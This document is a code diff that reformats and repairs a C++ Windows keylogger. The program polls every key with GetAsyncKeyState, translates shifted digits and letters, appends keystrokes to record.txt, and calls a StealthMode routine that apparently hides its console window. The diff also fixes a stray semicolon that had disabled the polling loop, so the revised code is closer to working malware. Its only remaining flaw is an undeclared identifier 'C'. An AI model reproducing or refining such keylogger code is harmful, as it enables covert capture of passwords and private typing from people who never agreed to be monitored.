@@ -8,8 +8,7 @@ using namespace std;
 void StealthMode();
 void StartLogging();
 
-int main()
-{
+int main() {
     StealthMode();
     StartLogging();
     return 0;
@@ -18,122 +17,101 @@ int main()
 void StartLogging()
 {
     char c;
-    for(;;)
-    {
-        for(c=8;c<=222;c++);
-        {
-            if(GetAsyncKeyState(c)==-32767)
-            {
+    for(;;) {
+        for(c=8;c<=222;c++) {
+            if(GetAsyncKeyState(c)==-32767) {
                 ofstream write("record.txt", ios::app);
-
-                if (((c>64)&&(c<91))&&!(GetAsyncKeyState(0x10)))
-                {
+                if (((c>64)&&(c<91))&&!(GetAsyncKeyState(0x10))) {
                     c+=32;
                     write<<c;
                     write.close();
                     break;
-                }
-                else if((c>64)&&(c<91))
-                {
+                } else if((c>64)&&(c<91)) {
                     write<<C;
                     write.close();
                     break;
-                }
-                else
-                {
-                    switch (c)
-                    {
-                        case 48:
-                        {
-                            if(GetAsyncKeyState(0x10))
+                } else {
+                    switch (c) {
+                        case 48: {
+                            if(GetAsyncKeyState(0x10)) {
                                 write<<")";
-                            else
+                            } else {
                                 write<<"0";
+                            }
                         }
                         break;
-
-                        case 49:
-                        {
-                            if(GetAsyncKeyState(0x10))
+                        case 49: {
+                            if(GetAsyncKeyState(0x10)) {
                                 write<<"!";
-                            else
+                            } else {
                                 write<<"1";
+                            }
                         }
                         break;
-
-                        case 50:
-                        {
-                            if(GetAsyncKeyState(0x10))
+                        case 50: {
+                            if(GetAsyncKeyState(0x10)) {
                                 write<<"@";
-                            else
+                            } else {
                                 write<<"2";
+                            }
                         }
                         break;
-
-                        case 51:
-                        {
-                            if(GetAsyncKeyState(0x10))
-
+                        case 51: {
+                            if(GetAsyncKeyState(0x10)) {
                                 write<<"#";
-                            else
+                            } else {
                                 write<<"3";
+                            }
                         }
                         break;
-
-                        case 52:
-                        {
-                            if(GetAsyncKeyState(0x10))
+                        case 52: {
+                            if(GetAsyncKeyState(0x10)) {
                                 write<<"$";
-                            else
+                            } else {
                                 write<<"4";
+                            }
                         }
                         break;
-                            
-                        case 53:
-                        {
-                            if(GetAsyncKeyState(0x10))
+                        case 53: {
+                            if(GetAsyncKeyState(0x10)) {
                                 write<<"%";
-                            else
+                            } else {
                                 write<<"5";
+                            }
                         }
                         break;
-
-                        case 54:
-                        {
-                            if(GetAsyncKeyState(0x10))
+                        case 54: {
+                            if(GetAsyncKeyState(0x10)) {
                                 write<<"^";
-                            else
+                            } else {
                                 write<<"6";
+                            }
                         }
                         break;
-
-                        case 55:
-                        {
-                            if(GetAsyncKeyState(0x10))
+                        case 55: {
+                            if(GetAsyncKeyState(0x10)) {
                                 write<<"&";
-                            else
+                            } else {
                                 write<<"7";
                             }
+                        }
                         break;
-
-                        case 56:
-                        {
-                            if(GetAsyncKeyState(0x10))
+                        case 56: {
+                            if(GetAsyncKeyState(0x10)) {
                                 write<<"*";
-                            else
+                            } else {
                                 write<<"8";
+                            }
                         }
                         break;
-
-                        case 57:
-                        {
-                            if(GetAsyncKeyState(0x10))
+                        case 57: {
+                            if(GetAsyncKeyState(0x10)) {
                                 write<<"(";
-                            else
+                            } else {
                                 write<<"9";
+                            }
                         }
                         break;
-
                         case VK_SPACE:
                             write<<" ";
                             break;
@@ -158,7 +136,7 @@ void StartLogging()
     }
 }
 
-void StealthMode()
+void StealthMode() 
 {
     HWND stealth;
     AllocConsole();
